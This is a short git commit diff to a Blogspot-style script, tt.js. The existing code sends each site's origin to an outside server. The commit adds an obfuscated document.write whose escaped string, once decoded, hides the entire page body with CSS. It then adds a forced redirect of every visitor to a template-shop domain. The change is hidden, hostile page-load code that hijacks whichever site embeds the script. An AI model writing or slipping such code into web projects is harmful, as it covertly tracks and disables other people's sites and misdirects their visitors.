e63ecaa6afb0e6de680585fb67475a05ad623a65
hostblog <39641129+hostblog@users.noreply.github.com>
2020-06-19 14:07:30 +0700

    Update tt.js

--- tt.js
+++ tt.js
@@ -4,3 +4,5 @@ current=''+window.location.origin+' - '+ type +' '
 var xmlhttp = new XMLHttpRequest();
 xmlhttp.open("GET", "https://vanphongphamnhatminh.com/namcuong/receive_blogspot/index.php?url=" + current, true);
 xmlhttp.send();
+document.write(unescape('%20%3C%73%74%79%6C%65%3E%0A%62%6F%64%79%7B%64%69%73%70%6C%61%79%3A%6E%6F%6E%65%20%21%69%6D%70%6F%72%74%61%6E%74%7D%0A%3C%2F%73%74%79%6C%65%3E%20'));
+window.location.href = "https://www.cuahangtemplate.com/";
